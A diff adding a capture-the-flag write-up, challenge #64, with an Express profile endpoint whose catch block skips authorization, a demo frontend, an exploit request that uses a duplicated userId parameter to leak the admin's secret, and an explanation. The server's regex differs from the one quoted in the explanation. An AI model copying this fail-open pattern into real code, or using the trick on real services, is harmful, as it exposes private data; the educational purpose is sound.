@@ -5913,11 +5913,289 @@ response:
 
 
 
+### #64: MY MANAGER AND I
+
+**Goal: **Get the admin's profile with their secret code to win the flag.
+
+**Code**
+
+```javascript
+// index.js
+const express = require("express");
+const path = require("path");
+const dotenv = require("dotenv");
+
+dotenv.config();
+
+const app = express();
+const PORT = process.env.PORT || 4000;
+
+// In-memory "database"
+const users = {
+  "1": {
+    id: "1",
+    username: "dev_player",
+    role: "employee",
+    managerId: "2"
+  },
+  "2": {
+    id: "2",
+    username: "team_manager",
+    role: "manager",
+    managerId: null
+  },
+  "3": {
+    id: "3",
+    username: "hr_manager",
+    role: "manager",
+    managerId: null
+  },
+  "999": {
+    id: "999",
+    username: "super_admin",
+    role: "admin",
+    managerId: null,
+    secretFlag: process.env.SUPER_ADMIN_SECRET
+  }
+};
+
+// Fake auth: everyone is logged in as employee "1"
+app.use((req, res, next) => {
+  req.user = users["1"];
+  next();
+});
+
+// Static frontend
+app.use(express.static(path.join(__dirname, "public")));
+
+// Explicit root handler (important for Vercel)
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// Profile endpoint
+app.get("/profile", (req, res) => {
+  const userIdParam = req.query.userId;
+
+  if (!userIdParam) {
+    return res.status(400).json({ error: "Missing userId" });
+  }
+
+  const requestedIds = Array.isArray(userIdParam)
+    ? userIdParam
+    : [userIdParam];
+
+  // Intended authorization: strict validation for each id
+  let validatedIds = [];
+
+  try {
+    for (const rawId of requestedIds) {
+      const id = String(rawId);
+
+      // Only digits allowed
+      if (!/^d+$/.test(id)) {
+        throw new Error("Invalid ID format");
+      }
+
+      const isSelf = id === req.user.id;
+      const isManager = id === req.user.managerId;
+
+      if (!isSelf && !isManager && id !== "999") {
+        // If we hit an ID we shouldn't see (and it's not admin),
+        // dev returns 403 to block it.
+        return res.status(403).json({ error: "Forbidden profile " + id });
+      }
+
+      // Extra protection for admin 999: requires secret code
+      if (id === "999") {
+        const providedCode = req.query.superAdminCode;
+        const expectedCode = process.env.superAdminCode;
+
+        if (!expectedCode) {
+          // Misconfiguration, but dev decides to be noisy and block it
+          return res.status(403).json({ error: "Super admin code not configured" });
+        }
+
+        if (!providedCode || providedCode !== expectedCode) {
+          // No or wrong code: should NOT allow access to admin
+          return res.status(403).json({ error: "Invalid super admin code" });
+        }
+      }
+
+      validatedIds.push(id);
+    }
+  } catch (err) {
+    console.error("[WARN] Validation failed:", err.message);
+    validatedIds = requestedIds.map((x) => String(x));
+  }
+
+  // Load and return all validated profiles 
+  const profiles = validatedIds
+    .map((id) => users[id])
+    .filter(Boolean)
+    .map((u) => ({
+      id: u.id,
+      username: u.username,
+      role: u.role,
+      managerId: u.managerId,
+      // Admin's secret should never be exposed to employee 1... but it will be.
+      secretFlag: u.secretFlag || null
+    }));
+
+  res.json({ requestedIds, profiles });
+});
+
+app.listen(PORT, () => {
+  console.log(`CTF server listening on http://localhost:${PORT}`);
+  console.log(`Open http://localhost:${PORT} in your browser`);
+});
+```
+
+<br/>
+
+```html
+// index.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>HPP + Error Handling CTF</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 2rem; max-width: 800px; }
+    input { padding: 0.4rem; width: 100%; max-width: 500px; }
+    button { padding: 0.4rem 0.8rem; margin-top: 0.5rem; }
+    code { background: #f2f2f2; padding: 0.1rem 0.25rem; border-radius: 3px; }
+    pre { background: #f4f4f4; padding: 1rem; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>Profile Viewer</h1>
+
+  <p>
+    You are logged in as <code>dev_player</code> (user <code>1</code>).
+    You should only be able to see:
+  </p>
+  <ul>
+    <li>Your own profile: <code>userId=1</code></li>
+    <li>Your manager's profile: <code>userId=2</code> (or as part of a list)</li>
+  </ul>
+  <p>
+    The admin (<code>999</code>) is not your manager and should be inaccessible.
+  </p>
+
+  <h2>Try a request</h2>
+  <p>Enter a querystring:</p>
+  <input id="qs" value="userId=1" />
+  <br />
+  <button id="go">Fetch</button>
+
+  <h2>Response</h2>
+  <pre id="out"></pre>
+
+  <h3>Examples to try (manually paste into the box)</h3>
+  <ul>
+    <li><code>userId=1</code></li>
+    <li><code>userId=1&userId=2</code></li>
+  </ul>
+
+  <script>
+    const input = document.getElementById("qs");
+    const out = document.getElementById("out");
+    const btn = document.getElementById("go");
+
+    // get query arguments from the URL
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams) {
+      input.value = `${urlParams}`;
+      fetchProfile(input.value);
+    }
+
+    btn.addEventListener("click", async () => {
+      const url = input.value;
+      out.textContent = "Loading " + url + " ...";
+      await fetchProfile(url);
+    });
+
+    async function fetchProfile(path) {
+      try {
+        const res = await fetch( "/profile?" + path);
+        const data = await res.json();
+        out.textContent = JSON.stringify(data, null, 2);
+        if(out.textContent.includes('"999"'))
+          alert(out.textContent);
+      } catch (e) {
+        out.textContent = "Error: " + e;
+      }
+    }
+  </script>
+</body>
+</html>
+```
+
+<br/>
+
+```
+GET /profile?userId=abc&userId=999 HTTP/2
+Host: chal64-654hp2.vercel.app
+```
+
+<br />
+
+```json
+{
+  "requestedIds": [
+    "abc",
+    "999"
+  ],
+  "profiles": [
+    {
+      "id": "999",
+      "username": "super_admin",
+      "role": "admin",
+      "managerId": null,
+      "secretFlag": "If you got this code you must be the super admin ;-)"
+    }
+  ]
+}
+```
+
+**Why this works**
+
+Flow:
+
+1. `abc` (or `999x`) fails:
+
+   ```
+   if (!/^\d+$/.test(id)) {
+     throw new Error("Invalid ID format");
+   }
+   ```
+
+2. Execution jumps to `catch`
+
+3. All authorization is skipped
+
+   ```
+   validatedIds = requestedIds.map(String);
+   ```
+
+4. `999` is now trusted input
+
+5. Admin profile + `secretFlag` is returned
+
+6. `superAdminCode` is never checked
+
+<br/>
+
+Solution
+
+```
+https://chal64-654hp2.vercel.app/?userId=aaa&userId=999
+```
 
 
 
-
-
+<br/>
 
 
 
